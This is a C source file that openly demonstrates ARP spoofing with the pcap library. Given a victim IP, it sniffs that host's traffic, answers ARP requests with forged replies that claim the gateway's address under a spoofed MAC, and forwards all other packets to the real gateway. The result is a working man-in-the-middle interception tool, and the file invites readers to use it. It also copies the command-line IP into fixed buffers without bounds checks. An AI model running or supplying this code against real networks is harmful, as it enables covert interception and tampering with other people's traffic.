/*
Name: arp.c
Purpose: To demonstrate how to do arp spoofing using PCAP libraries.
Author: Sreeram Vasudevan

NOTE: Feel free to use this file to see how ARP spoofing works. Needs Linux to work with PCAP libraries installed.

*/

#include "arp.h"

pcap_t* handle;

void set_filter_expr(char* filter_expr, char* victim_ip) {

  //NOTE: To set the filter expression for filtering the host as victim

	printf("set_filter_expr :: in");

	strcat(filter_expr,"host ");
	strcat(filter_expr,victim_ip);

	printf("set_filter_expr :: out");

	return;
}

void process_device(char* victim_ip, char* device, char* errbuf, struct bpf_program fp, bpf_u_int32 net, char* filter_expr) {

	printf("Process_Device :: in");	

	handle = pcap_open_live(device,SNAP_LEN,PROMISC,TIME_OUT,errbuf);
	
	if(handle == NULL) { 
		
	    printf("Process_Device :: handle is null. Program terminates.");
	    printf("Process_Device :: %s",errbuf);
            exit(EXIT_FAILURE); 
        }

	if(strlen(errbuf) > 0) {

	    printf("Process_Device :: Error Buffer cleaned.");
	    errbuf[0] = 0;
	}
	
	set_filter_expr(filter_expr,victim_ip);
	
	if(pcap_compile(handle, &fp, filter_expr,0,net) == -1) 	{

		printf("Process_Device :: Error in filter expression. ");		
		exit(EXIT_FAILURE);
	}

	if(pcap_setfilter(handle, &fp) == -1) 	{ 

		printf("Process_Device :: Filter expression not being set.");		
		exit(EXIT_FAILURE);
			
	}

	pcap_loop(handle,-1,process_packet,NULL);
	
	pcap_freecode(&fp);

	pcap_close(handle);

	printf("Process_Device :: out");

	return;
}

void process_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet) {

	struct Ethernet_Header *ethernet_header, *t_ethernet_header;
	struct ARP_Header *arp_header, *t_arp_header;

	ethernet_header = (struct Ethernet_Header*)packet;
	arp_header = (struct ARP_Header*)(packet + ETH_HEADER_LEN);

	if(ntohs(ethernet_header->protocol) == ARP_PROTOCOL)  //NOTE: if the packet is of ARP Type
	{
		unsigned char temp[6];
		
		printf("process_packet :: ARP Request found");

		//NOTE: Ethernet Packet formation
	
		memcpy(ethernet_header->dest_mac,ethernet_header->src_mac,MAC_ADDR_LEN);
		memcpy(ethernet_header->src_mac,(void*)ether_aton(SPOOFED_MAC),MAC_ADDR_LEN);

		//NOTE: ARP Packet formation
		
		arp_header->opcode = htons(ARPOP_REPLY);
		
		memcpy(temp,arp_header->src_mac,MAC_ADDR_LEN);
		memcpy(arp_header->src_mac,(void*)ether_aton(SPOOFED_MAC),MAC_ADDR_LEN);
		memcpy(arp_header->dest_mac,temp,MAC_ADDR_LEN);

		memcpy(temp,arp_header->src_ip,IP_ADDR_LEN);
		memcpy(arp_header->src_ip,GATEWAY_IP,IP_ADDR_LEN);	
		memcpy(arp_header->dest_ip,temp,IP_ADDR_LEN);

		//NOTE: Injecting the packet

		pcap_inject(handle,packet,sizeof(struct Ethernet_Header)+sizeof(struct ARP_Header));

		printf("process_packet :: Fake ARP reponse injected");
	}

	else
	{
		//NOTE: Simply forward the packet to the gateway
		
		memcpy(ethernet_header->src_mac,(void*)ether_aton(SPOOFED_MAC),MAC_ADDR_LEN);
		memcpy(ethernet_header->dest_mac,(void*)ether_aton(GATEWAY_MAC),MAC_ADDR_LEN);

		pcap_inject(handle,packet,header->caplen);
	}

	return;
}

int main(int argc, char** argv)  {

	char *device = DEF_ETH_DEV;
	char *network_addr, *net_mask;
	struct in_addr addr;
	char filter_expr[100]= "";
	bpf_u_int32 mask;
	bpf_u_int32 net;

	char victim_ip[100] = "";
	struct bpf_program fp;

	char err_buf[PCAP_ERRBUF_SIZE];
	
	printf("Main :: in");
	
	if(argc < 2)
	{
		printf("Please enter the Victim IP. The format for run is Prompt> program_name Victim_ip \n");		
		printf("Main :: Fewer Arguments, program exits");
		return 1;
	}

	pcap_lookupnet(device, &net, &mask, err_buf);

	//NOTE: After lookup adding the network address and netmask values


	addr.s_addr = net;
	network_addr= inet_ntoa(addr);
	addr.s_addr = mask;
	net_mask = inet_ntoa(addr);

	strcpy(victim_ip, argv[1]);

	process_device(victim_ip, device, err_buf, fp, net, filter_expr);

	printf("Main :: out");

	return 0;
}
